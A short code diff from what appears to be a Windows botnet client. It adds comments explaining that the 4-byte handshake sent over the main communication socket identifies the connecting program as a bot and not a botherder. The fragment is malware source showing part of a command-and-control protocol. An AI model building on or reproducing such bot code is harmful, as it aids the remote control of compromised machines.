@@ -154,6 +154,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 			UINT8 uintIdLen = strlen(chIdBuf); // length of the ID buffer
 
 			// sends 4 bytes to connect
+			// the 4 bytes identify it as a bot
+			// and not a botherder
 
 			send(dwMainCommSock, "\x00\x00\x00\x01", 4, NULL);
 			send(dwMainCommSock, (const char *)&uintIdLen, sizeof(uintIdLen), NULL);
